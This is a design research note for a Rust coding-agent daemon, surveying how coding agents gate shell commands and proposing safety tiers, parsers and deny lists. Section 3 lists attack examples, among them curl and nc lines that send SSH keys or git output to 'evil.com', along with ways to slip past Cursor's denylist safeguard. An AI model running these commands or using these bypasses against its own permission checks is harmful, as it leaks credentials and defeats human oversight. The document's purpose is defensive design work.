# Approval Guards: Rule-Based Safety Tiers for Autonomous Coding Agents

> Research date: 2026-06-19  
> Context: OxideMX `agentd` — Rust daemon, conductor carries `ApprovalPolicy` + `allowlist: Vec<String>`, `execute_command` self-gates. Goal: minimize blocking while staying safe.

---

## 1. How Real Tools Do It — Concrete Mechanisms

### Claude Code

Source: [Configure permissions — Claude Code Docs](https://code.claude.com/docs/en/permissions)

**Permission modes** (`defaultMode` in settings.json):

| Mode | Behavior |
|---|---|
| `plan` | Read-only; no file edits or state-mutating shell |
| `acceptEdits` | Auto-accepts file edits + safe FS commands (`mkdir`, `touch`, `mv`, `cp`) within cwd |
| `default` | Prompts on first use of each tool |
| `auto` | Background safety-classifier auto-approves; research preview |
| `dontAsk` | Auto-denies unless explicitly pre-approved |
| `bypassPermissions` | Skips prompts except explicit `ask` rules + circuit-breakers (`rm -rf /`, `rm -rf ~`) |

**Tiered tool treatment** (built-in, not configurable):

| Tool class | Default behavior |
|---|---|
| Read-only Bash (`ls`, `cat`, `grep`, `find`, `git status`, `git diff`, `git log`, etc.) | **No prompt** in every mode |
| File reads | No prompt |
| File edits/writes | Prompt (session-scoped "yes don't ask again") |
| Bash (state-mutating) | Prompt (project+command-scoped "yes don't ask again") |

**Rule format** in `settings.json`:
```json
{
  "permissions": {
    "allow": [
      "Bash(npm run lint)",
      "Bash(git commit *)",
      "Bash(git diff *)",
      "Bash(* --version)",
      "Bash(* --help *)"
    ],
    "deny": [
      "Bash(git push *)",
      "Bash(rm -rf *)"
    ]
  }
}
```

Rule evaluation order: **deny → ask → allow**. A deny always wins over a narrower allow. There are no "allow exceptions inside a deny" — scoping matters.

**Compound command awareness** (critical): Claude Code parses shell operators (`&&`, `||`, `;`, `|`, `|&`, `&`, newlines) and checks *each subcommand independently*. `Bash(safe-cmd *)` does NOT cover `safe-cmd && other-cmd`. Rules must match every subcommand. When a compound command is approved with "don't ask again", it saves separate per-subcommand rules (up to 5).

**Process wrapper stripping**: Before rule matching, Claude Code strips `timeout`, `time`, `nice`, `nohup`, `stdbuf`, bare `xargs`. So `Bash(npm test *)` also matches `timeout 30 npm test`. Exec wrappers (`watch`, `setsid`, `flock`, `find -exec`) always prompt — no prefix rule covers them.

**PreToolUse hooks**: Shell commands that run before the permission prompt. A hook exiting code 2 blocks the tool call *before permission rules* (even overrides an allow rule). A hook returning `"deny"` is subject to rule precedence. Pattern: `allow: ["Bash"]` broadly + hook that pattern-matches dangerous commands to deny. Hooks cannot be overridden by user settings if `allowManagedHooksOnly: true` in managed settings.

**Read/Edit path scoping**: Rules use gitignore-style patterns with anchors: `//` = filesystem root, `~/` = home, `/` = project root, bare = cwd-relative. `Edit(/src/**)` restricts edits to `<project>/src/`. Symlink double-checking: allow rules require *both* symlink and target to match; deny rules fire if *either* matches.

### Cursor

Sources: [Agent Security — Cursor Docs](https://cursor.com/docs/agent/security), [Backslash Security Analysis](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist), [The Register](https://www.theregister.com/2025/07/21/cursor_ai_safeguards_easily_bypassed/)

Cursor v3.6+ uses **Auto-review** as the recommended default:
1. Allowlisted calls → run instantly
2. Sandboxable calls → run in Cursor's sandbox automatically  
3. Everything else → LLM classifier subagent decides: allow / alternative / ask

The denylist (specifying commands agent must not invoke) was found to have **four bypass classes**:
- **Obfuscation**: base64-encoded commands
- **Subshell execution**: `$(rm -rf .)` bypasses string matching
- **Shell scripts**: embedding the command in a file
- **Quote escaping**: `"e"cho` and `""e""cho` execute identically to `echo` but aren't string-matched

Cursor acknowledged these as "systemic issues" in September 2025 and released a fix in January 2026. The denylist is being deprecated in favor of allowlist-only + sandbox enforcement. **Lesson: string-prefix denylist on raw shell strings is fundamentally broken.**

### OpenHands

Source: [OpenHands GitHub issue #2308](https://github.com/OpenHands/OpenHands/issues/2308), [OpenHands SDK paper](https://arxiv.org/html/2511.03690v1)

OpenHands runs inside a sandboxed workspace (filesystem + terminal + browser). **Confirmation mode** (opt-in): when NOT inside a sandbox, or when the user wants oversight, the frontend prompts for approval on every action. The V1 SDK (Nov 2025) splits into four packages: agent SDK, Tools layer (action handlers), Workspace layer (execution environments), Server. This clean separation is the key architectural insight — the *action handler* is where gating belongs, decoupled from the agent's planning.

### Codex CLI (OpenAI)

Source: [OpenAI Codex agent approvals](https://developers.openai.com/codex/agent-approvals-security), [frr.dev](https://www.frr.dev/posts/codex-cli-autonomous-agent-two-flags/)

**Two-axis model**: `sandbox` (what can it do technically) × `approval-policy` (when must it ask):

| Approval policy | Behavior |
|---|---|
| `on-request` | Confirm sandbox escalations, network, side-effecting ops |
| `never` | No prompts; respects sandbox constraints only |
| `untrusted` | Auto-executes known-safe reads; asks for state-mutating commands |

Sandbox modes (`workspace-write`: edits confined to cwd; `read-only`: no modifications) enforced via OS-level isolation: macOS `sandbox-exec`/Seatbelt, Linux `bwrap`+`seccomp`, Windows WSL2. Protected paths: `.git/` and `.codex/` are read-only even in workspace-write mode.

`--full-auto` = `--approval-mode never` + `--sandbox workspace-write`. Without it, `rm -rf`, uncommitted overwrites, and force-pushes can run unguarded.

**"untrusted" mode** (most relevant to our design): auto-runs known-safe reads, prompts on anything that mutates state. This is the closest to what we want.

### Aider

Source: [Pinggy blog — best CLI agents 2026](https://pinggy.io/blog/best_open_source_cli_coding_agents/)

Aider stays in an **edit-and-commit lane**: it focuses exclusively on code editing + git commits. `--yes` bypasses all confirmation prompts. Auto-commit is on by default — every change is immediately committed, making rollback trivial (`git revert`). The design philosophy: constrain the blast radius structurally (only code edits + git), not by parsing shell strings.

### Common Model Across Tools

All tools converge on the same three-layer model:

1. **Structural constraint first**: run inside a sandbox, restrict filesystem scope to cwd, block network by default. This is the OS-level hard wall.
2. **Tiered policy second**: read-only ops auto-allowed; reversible writes auto-allowed (often with scope constraint); state-mutating or cross-boundary ops require approval.
3. **Hooks/classifiers for edge cases**: what rules can't express cleanly, hooks + LLM classifiers handle. Denylist-only approaches are broken; allowlist + deny-residual is safer.

---

## 2. The Reversibility Heuristic

### The Core Principle

Source: [Eric Ma's autonomous agent guide](https://ericmjl.github.io/blog/2025/11/8/safe-ways-to-let-your-coding-agent-work-autonomously/)

The key distinction is **whether a command changes state, and how recoverable that state change is**:

| Action | Category | Why |
|---|---|---|
| `git status`, `git diff`, `git log` | Read → AutoAllow | Pure read, no state change |
| `git add` | Reversible → AutoAllow | Staging area, undone by `git restore --staged` |
| Edit tracked file in cwd | Reversible → AutoAllow (with scope guard) | `git restore <file>` recovers it |
| Delete tracked file in cwd | Reversible → AutoAllow (with scope guard) | `git restore <file>` recovers it |
| Edit **un**tracked file | Ask | No VCS recovery path |
| `git commit` | Ask | Changes repo history |
| `git push` | Deny (or explicit Allow) | Remote state; recovery requires force-push |
| `git push --force` | AutoDeny | Remote state destruction |
| Anything outside cwd | Ask or Deny | Scope boundary violation |
| `sudo`, `su` | AutoDeny | Privilege escalation |
| Network mutations (curl POST, etc.) | AutoDeny or Ask | External side effects |
| `.git/` writes | AutoDeny | Repository integrity |

### The Git-Restorable Classifier

A file edit/delete is "git-restorable" if ALL of the following hold:
1. The path is under `cwd` (the project root)
2. The path is tracked in git (`git ls-files --error-unmatch <path>` exits 0)
3. The file is NOT inside `.git/`, `.ssh/`, or other protected dirs
4. The repo has at least one commit (so `git restore` has something to restore to)

In Rust with `git2`:
```rust
use git2::Repository;

fn is_git_restorable(repo: &Repository, abs_path: &Path) -> bool {
    let workdir = match repo.workdir() { Some(d) => d, None => return false };
    let rel = match abs_path.strip_prefix(workdir) { Ok(r) => r, Err(_) => return false };
    // Check it's tracked (exists in HEAD tree)
    if let Ok(head) = repo.head() {
        if let Ok(tree) = head.peel_to_tree() {
            return tree.get_path(rel).is_ok();
        }
    }
    false
}
```

Codex CLI uses the same principle: `.git/` is protected even in workspace-write mode, and the workspace boundary is enforced at the OS sandbox level.

---

## 3. The Hard Problem: Classifying Shell Command Strings

### Why Prefix-Allowlisting Is Dangerous

Source: [Claude Code docs — prefix pattern warning](https://code.claude.com/docs/en/permissions), [Backslash denylist analysis](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist)

A rule like `allow if starts_with("git ")` is broken because:

| Attack vector | Example | Why it bypasses |
|---|---|---|
| Compound with `;` | `git status; rm -rf .` | `;` is a statement separator — `rm` runs |
| Compound with `&&` | `git diff && curl evil.com/exfil?f=$(cat ~/.ssh/id_rsa)` | Shell expands the whole string |
| Pipe | `git log \| nc evil.com 4444` | Sends output to network |
| Subshell | `git $(echo push --force)` | Subshell evaluated by shell before git sees args |
| Backticks | `` git `cat /tmp/injected` `` | Same as subshell |
| Command substitution in var | `CMD="push --force"; git $CMD` | Variable expansion |
| Obfuscation | `git push --force` embedded in base64-decoded script | String matching misses entirely |
| Allowlisted binary used as runner | `git -c core.pager='rm -rf .' log` | Binary itself runs attacker-controlled command |
| Environment variable tricks | `GIT_SSH_COMMAND='evil.sh' git pull` | Env vars modify binary behavior |
| Quote escaping | `"g"it push` (Bash parses identically) | String match fails |

**Mathematical principle** (from Backslash research): for every command in a denylist, there are *infinitely many* shell strings that execute identically. String-level denylist is unwinnable.

### What Works Instead

**1. Parse before matching (shell-words crate in Rust)**

Use `shell-words::split()` to tokenize the command string, then inspect argv[0] and argv[1..]. This defeats most quoting tricks because the shell's own parser is replicated:

```rust
use shell_words;

fn classify_command(cmd: &str) -> SafetyTier {
    // First: reject if any shell metacharacter exists at top level
    if has_shell_metachar(cmd) {
        return SafetyTier::Ask; // metachar forces downgrade
    }
    // Then parse
    match shell_words::split(cmd) {
        Ok(argv) if !argv.is_empty() => classify_argv(&argv),
        _ => SafetyTier::Ask,
    }
}

fn has_shell_metachar(cmd: &str) -> bool {
    // These all enable injection past argv[0] checking
    cmd.contains(';') || cmd.contains("&&") || cmd.contains("||")
        || cmd.contains('|') || cmd.contains('`') || cmd.contains("$(")
        || cmd.contains("${") || cmd.contains('&') || cmd.contains('>')
        || cmd.contains('<') || cmd.contains('\n')
        // Env var prefix assignment: "FOO=bar cmd"
        || LEADING_ENV_VAR_RE.is_match(cmd)
}
```

**2. Execute without a shell when possible**

`std::process::Command::new("git").arg("diff").arg("HEAD")` — no shell, no metachar expansion. If the agent generates the argv vector rather than a shell string, metachar injection is structurally impossible. Reserve `sh -c` / `bash -c` for commands that genuinely need shell features; those always go to Ask tier.

**3. Per-binary + per-subcommand rules, not per-prefix**

```
git status          → AutoAllow (read-only)
git diff *          → AutoAllow (read-only)
git add <path>      → AutoAllow (reversible, path in cwd)
git restore *       → AutoAllow (restorable)
git stash           → AutoAllow (reversible)
git commit *        → Ask
git push *          → Ask (or Deny if --force present)
git push --force *  → AutoDeny
git push *--force*  → AutoDeny
git rebase *        → Ask
git reset --hard *  → Ask
```

This is argv[0] + argv[1] matching, not string prefix matching. Claude Code's documented approach: the space before `*` in `Bash(ls *)` enforces a word boundary; without it, `ls*` matches `lsof`. Our system should do the same with parsed argv.

**4. Hard denylist of dangerous patterns in parsed argv**

Regardless of allowlist, always-deny if parsed argv contains:
- `argv[0]` in `{sudo, su, pkexec, doas}`
- `argv[0..2]` matches `{git push --force, git push -f, git reset --hard, git clean -fd, git clean -f}`
- `argv[0]` in `{rm}` with `-r` or `-rf` flag (unless path is inside cwd AND tracked)
- `argv[0]` in `{curl, wget, nc, ncat, socat}` (network mutation tools) — route through WebFetch instead
- any `argv` containing `..` path segments that escape cwd
- `argv[0]` in `{chmod, chown, mount}` — privilege/system mutations

**5. Shell metacharacter forces Ask, not AutoDeny**

Don't AutoDeny compound commands — they're often legitimate (e.g., `cd src && cargo build`). Downgrade to Ask, display the raw command string, let the user decide.

**Claude Code's compound command handling** (the gold standard approach): parse each subcommand independently; every subcommand must match an allow rule independently. Approving saves per-subcommand rules. This is the correct model.

---

## 4. Non-Blocking Designs

### The Core Problem

If the agent blocks waiting for human approval, long-running background tasks stall. The user is context-switched. Approval fatigue sets in and they start clicking "allow" on everything.

### Patterns That Work

**A. Risk-tiered auto-approval** (most important)
Auto-approve the bottom N% of risk. If 80% of actions are file reads + git status/diff + cargo build, and those are all AutoAllow, the user only sees the top 20%. Cursor's Auto-review reported an 84% reduction in approval prompts by auto-classifying. The key: reads + builds + lints are structurally safe; route them past the prompt entirely.

**B. Blocked-action ledger (queue-and-continue)**
When a risky action is needed, don't block the agent — emit a `BlockedAction` event to a ledger and let the agent continue with other available work. The UI surfaces a "Needs approval" badge. The user batch-reviews at their pace. The agent resumes the blocked subtask when approved.

Design sketch:
```rust
pub enum ActionOutcome {
    Executed(Output),
    AutoApproved(Output),  // matched AutoAllow tier
    Blocked(BlockedAction), // needs human review
    Denied(DenyReason),     // matched AutoDeny tier
}

pub struct BlockedAction {
    pub id: Uuid,
    pub tool: ToolCall,
    pub tier: SafetyTier,
    pub reason: String,
    pub requested_at: Instant,
    pub expires_at: Option<Instant>,
}
```

The conductor advances the task DAG; nodes depending on the blocked action wait; independent nodes continue. This mirrors how Claude Code's checkpoint + `/rewind` system works — state is preserved so the agent can resume.

**C. Session-scoped grants**
"Always allow this command for this session" — stored in an in-memory `HashSet<AllowedPattern>` that clears on session end. Prevents re-asking for `cargo test` on every invocation. Claude Code's "Yes, don't ask again" (for edits: session-scoped; for bash: project+command-scoped) implements this.

**D. Learning allowlist**
Commands the user approves get persisted to the project allowlist (`settings.json` or equivalent). Over time the approval rate asymptotes toward the auto-tier rate. This is the Claude Code "permanent per project directory and command" mechanism.

**E. Batch approval UI**
Surface multiple pending blocked actions at once. Let the user approve/deny/always-allow each with a single key. Avoids the "one at a time" interrupt pattern.

**F. Plan-first mode**
For complex multi-step tasks, have the agent emit a full plan (list of intended tool calls) before executing. User approves the plan, not individual steps. Claude Code's `plan` mode implements the read-only phase of this. OpenHands's confirmation mode gates at the action level; plan-first gates at the plan level.

**G. Risk-level throttling**
AutoAllow tier: execute immediately. Ask tier: add to ledger, continue other work. AutoDeny tier: refuse and explain. The agent's retry budget applies only to Ask-tier refusals (user said no) and AutoDeny (hard rule) — not to network errors or build failures.

---

## 5. Recommendation: Safety Tier System for OxideMX agentd

### The Four Tiers

```rust
pub enum SafetyTier {
    /// Execute immediately, no human review.
    AutoAllow,
    /// Execute if the target is git-tracked and within cwd.
    /// Falls back to Ask if reversibility check fails.
    AutoAllowIfReversible,
    /// Queue to blocked-action ledger; agent continues other work.
    Ask,
    /// Refuse immediately; no ledger entry; explain why.
    AutoDeny,
}
```

| Tier | Example actions |
|---|---|
| `AutoAllow` | `git status`, `git diff *`, `git log *`, `cargo check`, `cargo test`, `ls`, `cat <file in cwd>`, `grep *`, `find . *`, read any file in cwd |
| `AutoAllowIfReversible` | Edit tracked file in cwd, delete tracked file in cwd, `git add <path>`, `git restore *`, `git stash` |
| `Ask` | Write NEW (untracked) file, `git commit *`, any compound shell command, `cargo install`, shell command with metacharacters, edit outside cwd, `git push` (no --force) |
| `AutoDeny` | `sudo`/`su`/`pkexec`, `git push --force`, `git reset --hard`, `git clean -f`, `rm -rf` with unscoped path, `curl`/`wget`/`nc` (network write), any path with `..` escaping cwd, write to `.git/`, write to `~/.config/` or `~/.ssh/` |

### The Reversibility Classifier

```rust
pub struct ReversibilityClassifier {
    repo: git2::Repository,
    cwd: PathBuf,
}

impl ReversibilityClassifier {
    /// Returns true iff the path is under cwd, is tracked in git HEAD,
    /// and is not in a protected directory.
    pub fn is_restorable(&self, path: &Path) -> bool {
        let abs = if path.is_absolute() { path.to_owned() } else { self.cwd.join(path) };
        // Must be under cwd
        let rel = match abs.strip_prefix(&self.cwd) { Ok(r) => r, Err(_) => return false };
        // Must not escape into .git or protected dirs
        if rel.starts_with(".git") || rel.starts_with(".ssh") { return false; }
        // Must be tracked in HEAD tree
        if let Ok(head) = self.repo.head() {
            if let Ok(tree) = head.peel_to_tree() {
                return tree.get_path(rel).is_ok();
            }
        }
        false
    }
}
```

Deps: `git2 = "0.19"`. No subprocess overhead — pure in-process libgit2.

### The Shell Command Safety Classifier

```rust
use shell_words;

// Shell metacharacters that defeat argv-level analysis
const SHELL_METACHARS: &[&str] = &[
    ";", "&&", "||", "|", "`", "$(", "${", "&", ">", "<", "\n",
];

// Regex for leading env-var assignment: FOO=bar cmd
static LEADING_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*[A-Z_][A-Z0-9_]*=\S*\s+").unwrap()
});

pub fn classify_shell_command(cmd: &str, rev: &ReversibilityClassifier) -> SafetyTier {
    // 1. Detect shell metacharacters → downgrade to Ask (not AutoDeny)
    if SHELL_METACHARS.iter().any(|m| cmd.contains(m)) || LEADING_ENV_RE.is_match(cmd) {
        return SafetyTier::Ask;
    }
    // 2. Parse into argv
    let argv = match shell_words::split(cmd) {
        Ok(v) if !v.is_empty() => v,
        _ => return SafetyTier::Ask,
    };
    // 3. Hard denylist on argv[0]
    match argv[0].as_str() {
        "sudo" | "su" | "pkexec" | "doas" => return SafetyTier::AutoDeny,
        "curl" | "wget" | "nc" | "ncat" | "socat" | "ssh" | "scp" | "rsync" => {
            return SafetyTier::AutoDeny; // network mutation; use WebFetch instead
        }
        "rm" | "rmdir" => {
            // Allow only if target is in cwd and git-tracked
            return classify_rm(&argv, rev);
        }
        _ => {}
    }
    // 4. Git subcommand table
    if argv[0] == "git" {
        return classify_git_subcommand(&argv);
    }
    // 5. Cargo/build tools
    if let Some(tier) = classify_cargo(&argv) {
        return tier;
    }
    // 6. Known read-only tools
    if READ_ONLY_BINARIES.contains(&argv[0].as_str()) {
        return SafetyTier::AutoAllow;
    }
    // 7. Unknown → Ask
    SafetyTier::Ask
}

fn classify_git_subcommand(argv: &[String]) -> SafetyTier {
    let sub = argv.get(1).map(String::as_str).unwrap_or("");
    // Flags anywhere in argv
    let has_force = argv.iter().any(|a| a == "--force" || a == "-f");
    let has_hard  = argv.iter().any(|a| a == "--hard");
    match sub {
        "status" | "diff" | "log" | "show" | "blame" | "shortlog"
        | "describe" | "rev-parse" | "ls-files" | "ls-tree" | "cat-file" => SafetyTier::AutoAllow,
        "add" | "restore" | "stash" | "checkout" if !has_force => SafetyTier::AutoAllowIfReversible,
        "push" if has_force => SafetyTier::AutoDeny,
        "push" => SafetyTier::Ask,
        "commit" | "merge" | "rebase" | "cherry-pick" | "tag" | "branch" => SafetyTier::Ask,
        "reset" if has_hard => SafetyTier::AutoDeny,
        "reset" => SafetyTier::Ask,
        "clean" => SafetyTier::AutoDeny,
        _ => SafetyTier::Ask,
    }
}

const READ_ONLY_BINARIES: &[&str] = &[
    "ls", "cat", "head", "tail", "grep", "rg", "find", "fd", "wc",
    "which", "diff", "stat", "du", "pwd", "echo", "printf", "date",
    "env", "uname", "hostname", "id", "whoami", "file", "hexdump",
    "cargo", // handled by classify_cargo
];
```

**Key insight**: shell metacharacters force a downgrade to `Ask` (not `AutoDeny`) because compound commands are often legitimate. The user sees the raw string and decides. This matches Claude Code's behavior: compound commands always prompt; approving them saves per-subcommand rules.

### Per-Command Rule Schema (JSON config)

```json
{
  "approvalRules": {
    "defaultTier": "Ask",
    "rules": [
      { "binary": "git", "subcommand": "status", "tier": "AutoAllow" },
      { "binary": "git", "subcommand": "diff",   "tier": "AutoAllow" },
      { "binary": "git", "subcommand": "add",    "tier": "AutoAllowIfReversible" },
      { "binary": "git", "subcommand": "push",   "flagDeny": ["--force", "-f"], "tier": "Ask", "flagDenyTier": "AutoDeny" },
      { "binary": "cargo", "subcommand": "build", "tier": "AutoAllow" },
      { "binary": "cargo", "subcommand": "test",  "tier": "AutoAllow" },
      { "binary": "cargo", "subcommand": "install","tier": "Ask" },
      { "binary": "sudo",  "tier": "AutoDeny" }
    ],
    "pathRules": [
      { "pattern": ".git/**", "tier": "AutoDeny" },
      { "pattern": "~/.ssh/**", "tier": "AutoDeny" },
      { "pattern": "../**", "tier": "AutoDeny" }
    ]
  }
}
```

This schema can be deserialized by `serde_json` and evaluated before the built-in classifier, letting users extend the system without recompiling.

### The Non-Blocking Ledger

The `ApprovalPolicy` in the conductor should be extended:

```rust
pub enum ApprovalPolicy {
    /// Auto-classify by safety tier. Ask-tier goes to ledger, not blocking prompt.
    RuleBased {
        rules: ApprovalRules,
        ledger: Arc<Mutex<BlockedActionLedger>>,
    },
    /// Session-wide allowlist (user said "always allow" for these patterns)
    SessionAllowlist(HashSet<ApprovedPattern>),
    /// Full bypass — only for sandboxed/isolated environments
    BypassPermissions,
}

pub struct BlockedActionLedger {
    pub pending: Vec<BlockedAction>,
    pub resolved: Vec<ResolvedAction>, // for audit trail
}
```

The D-Bus interface exposes:
- `GetPendingApprovals() -> Vec<BlockedAction>` — UI polls or subscribes
- `ApproveAction(id: Uuid) -> ()` — user approves; agent resumes blocked node
- `DenyAction(id: Uuid, reason: String) -> ()` — user rejects; agent gets error
- `AlwaysAllowPattern(pattern: ApprovedPattern) -> ()` — adds to session allowlist

### Default Safe-Command Allowlist (ship this)

```
# File reads
Read(**/*) within cwd

# Shell — AutoAllow tier
git status, git diff *, git log *, git show *, git ls-files *
cargo check, cargo build *, cargo test *, cargo clippy *
ls *, cat * (within cwd), grep *, rg *, fd *, find . *
wc *, diff *, stat *, du *, which *, head *, tail *
rustfmt *, rustc --version, cargo --version, * --version, * --help *

# Shell — AutoAllowIfReversible (git-tracked file in cwd)
git add *, git restore *, git stash
Edit/Write to tracked file within cwd

# Hard denylist — AutoDeny
sudo, su, pkexec, doas
git push --force / git push -f
git reset --hard, git clean -f*
rm -rf (unscoped or outside cwd)
curl/wget/nc/socat (network write tools)
Any path with .. escaping cwd
Any write to .git/, ~/.ssh/, ~/.config/
```

### Rust Crates Needed

| Crate | Use |
|---|---|
| `git2 = "0.19"` | Reversibility classifier — check HEAD tree for path |
| `shell-words = "1"` | Parse shell command string into argv without spawning a shell |
| `regex` | Leading env-var detection (`FOO=bar cmd`) |
| `glob` or `globset` | Path pattern matching for path rules |
| `serde_json` | Load user-defined rule overrides |

---

## Summary: The Common Model

All major tools (Claude Code, Codex CLI, Cursor, OpenHands, Aider) converge on:

1. **Structural sandbox first** — OS-level cwd confinement beats string-level rules
2. **Reads are always free** — no prompt for observation-only actions
3. **VCS-tracked edits are nearly free** — git is the undo button; inside-cwd + tracked = reversible
4. **String-level denylist is broken** — Cursor's denylist was bypassed via subshells, quoting, encoding; Claude Code addresses this by parsing compound commands
5. **Allowlist + deny-residual** — broad allow for known-safe patterns; Ask for unknown; AutoDeny for small hard list of escalations
6. **Non-blocking ledger** — queue blocked actions; continue independent work; batch-review UI

The safest conservative approach: **execute without a shell** when possible; when a shell string is unavoidable, parse with `shell-words`, reject on metacharacters (downgrade to Ask), match on `argv[0]` + `argv[1]`, apply the four-tier table above.

---

## Sources

- [Configure permissions — Claude Code Docs](https://code.claude.com/docs/en/permissions)
- [Claude Code Settings & Bash Tool Security — General Analysis](https://generalanalysis.com/guides/claude-code-settings-permissions-bash-tool-security)
- [Cursor Agent Security Docs](https://cursor.com/docs/agent/security)
- [Cursor Auto-Review cuts approvals 84% — AlphaSignal](https://alphasignal.ai/news/cursor-s-auto-review-cuts-agent-approval-prompts-by-84-using-ai)
- [Cursor denylist bypass analysis — Backslash Security](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist)
- [Cursor YOLO mode bypasses — The Register](https://www.theregister.com/2025/07/21/cursor_ai_safeguards_easily_bypassed/)
- [OpenAI Codex agent approvals and security](https://developers.openai.com/codex/agent-approvals-security)
- [Codex CLI full-auto mode — frr.dev](https://www.frr.dev/posts/codex-cli-autonomous-agent-two-flags/)
- [OpenHands SDK paper — arxiv](https://arxiv.org/html/2511.03690v1)
- [OpenHands confirmation mode — GitHub issue #2308](https://github.com/OpenHands/OpenHands/issues/2308)
- [Safe autonomous agent operation — Eric Ma](https://ericmjl.github.io/blog/2025/11/8/safe-ways-to-let-your-coding-agent-work-autonomously/)
- [Best CLI coding agents 2026 — Pinggy](https://pinggy.io/blog/best_open_source_cli_coding_agents/)
- [The Agent Security Paradox — Pillar Security](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors)
